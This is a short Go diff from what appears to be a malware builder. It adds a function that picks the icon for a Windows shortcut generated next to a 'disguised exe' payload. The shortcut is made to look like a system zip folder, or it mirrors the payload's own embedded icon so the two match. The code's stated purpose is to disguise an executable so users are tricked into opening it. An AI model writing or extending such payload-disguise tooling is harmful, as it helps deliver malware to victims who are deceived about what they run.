@@ -147,3 +147,19 @@ func DisguiseFileVers(disguise string) (fv, pv [4]uint16) {
 	_, _, fvStr, pvStr := DisguiseFileMeta(disguise)
 	return parse(fvStr), parse(pvStr)
 }
+
+// DisguiseLnkIcon returns the IconLocation baked into a generated .lnk
+// sitting next to the disguised exe. zip points at the guaranteed system
+// zip icon; every other disguise mirrors the sibling payload embedded
+// icon (exeName plus index 0), which injectIconResource always derives
+// from the same disguise preset, so the shortcut can never drift from
+// the payload. Empty disguise keeps the generic document icon.
+func DisguiseLnkIcon(disguise, exeName string) string {
+	if NormalizeDisguise(disguise) == "zip" {
+		return "%SystemRoot%\\System32\\zipfldr.dll,0"
+	}
+	if exeName != "" {
+		return exeName + ",0"
+	}
+	return DefaultLnkIconLocation
+}
